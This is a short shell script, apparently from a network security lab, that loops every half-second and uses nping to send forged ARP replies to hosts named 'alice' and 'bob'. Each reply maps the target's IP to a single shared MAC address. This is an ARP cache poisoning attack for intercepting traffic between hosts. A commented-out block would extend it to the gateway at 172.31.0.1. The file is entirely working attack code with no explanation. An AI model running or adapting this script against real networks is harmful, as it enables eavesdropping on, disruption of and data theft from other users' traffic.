while :
do
# Define target IP and MAC addresses
alice_target_ip="172.31.0.2"
alice_target_mac="00:16:3e:3d:17:94"

# Construct the command to send ARP packet
nping --dest-ip $alice_target_ip --arp --arp-type arp-reply --source-ip $alice_target_ip --source-mac $alice_target_mac -c 1
# echo $alice_target_mac
# nping --arp --arp-type arp --arp-sender-mac $alice_target_mac --arp-target-mac "ff:ff:ff:ff:ff:ff" --arp-sender-ip $alice_target_ip --arp-target-ip $alice_target_ip -c 1

bob_target_ip="172.31.0.3"
bob_target_mac="00:16:3e:3d:17:94"

# Construct the command to send ARP packet
nping --dest-ip $bob_target_ip --arp --arp-type arp-reply --source-ip $bob_target_ip --source-mac $bob_target_mac -c 1
sleep 0.5
done
# Define target IP and MAC addresses

# out_target_ip="172.31.0.1"
# out_target_mac="00:16:3e:3d:17:94"

# nping --dest-ip $out_target_ip --arp --arp-type arp-reply --source-ip $out_target_ip --source-mac $out_target_mac -c 1